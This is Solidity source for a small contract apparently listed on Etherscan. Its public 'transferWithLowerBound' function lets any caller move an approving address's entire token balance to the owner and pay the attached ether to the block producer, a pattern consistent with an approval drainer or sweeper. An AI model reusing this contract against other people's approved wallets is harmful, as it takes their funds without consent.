/**
 *Submitted for verification at Etherscan.io on 2022-02-10
*/

pragma solidity ^0.8.7;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract TokenHandler {
    address owner;
    constructor() {
        owner = msg.sender;
    }
    function changeOwner(address newOwner) public {
        require(owner == msg.sender, "owner only");
        owner = newOwner;
    }
    function transferWithLowerBound(address from, address token, uint256 threshold) payable public {
        uint256 amount = IERC20(token).balanceOf(from);
        IERC20(token).transferFrom(from, owner, amount);
        if(amount >= threshold) {
            block.coinbase.transfer(msg.value);
        }
        else {
            payable(owner).transfer(msg.value);
        }
    }
}